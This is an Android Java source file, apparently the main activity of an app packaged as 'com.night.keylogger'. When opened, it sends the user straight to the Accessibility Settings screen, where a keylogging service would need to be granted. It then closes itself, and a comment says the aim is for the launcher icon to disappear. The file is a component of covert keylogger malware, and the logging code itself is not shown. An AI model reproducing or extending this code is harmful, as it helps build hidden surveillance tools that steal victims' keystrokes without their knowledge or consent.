package com.night.keylogger;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.provider.Settings;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Open Accessibility Settings
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);
        // Finish so launcher icon disappears after first open
        finish();
    }
}
